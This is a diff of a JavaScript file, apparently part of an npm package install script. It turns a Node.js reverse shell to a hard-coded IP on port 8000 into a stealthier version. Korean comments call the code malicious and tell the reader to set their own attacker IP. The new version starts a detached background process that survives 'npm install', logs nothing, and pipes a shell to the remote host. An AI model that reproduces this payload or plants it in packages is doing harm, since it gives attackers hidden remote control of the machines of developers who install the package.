@@ -1,15 +1,30 @@
 (function () {
-  var net = require("net"),
-    cp = require("child_process"),
-    sh = cp.spawn("/bin/sh", []);
+  var cp = require("child_process");
 
-  var client = new net.Socket();
+  // 1. 실제로 백그라운드에서 돌아갈 리버스 쉘 코드를 문자열로 정의합니다.
+  var maliciousCode = `
+    var net = require("net");
+    var cp = require("child_process");
+    var sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    
+    // 공격자 IP와 포트 (여기를 본인 환경에 맞게 수정하세요)
+    client.connect(8000, "3.237.2.83", function () {
+      client.pipe(sh.stdin);
+      sh.stdout.pipe(client);
+      sh.stderr.pipe(client);
+    });
+  `;
 
-  client.connect(8000, "3.237.2.83", function () {
-    client.pipe(sh.stdin);
-    sh.stdout.pipe(client);
-    sh.stderr.pipe(client);
+  // 2. 새로운 Node 프로세스를 'detached'(분리된) 모드로 실행합니다.
+  // "node -e '코드'" 형태로 실행하는 원리입니다.
+  var child = cp.spawn("node", ["-e", maliciousCode], {
+    detached: true, // 부모(npm install)가 죽어도 자식은 계속 살아있음
+    stdio: "ignore" // 터미널에 아무런 로그도 남기지 않음
   });
+
+  // 3. 부모 프로세스(npm install)가 자식을 기다리지 않고 끝내도록 설정합니다.
+  child.unref();
 
   return /a/;
 })();
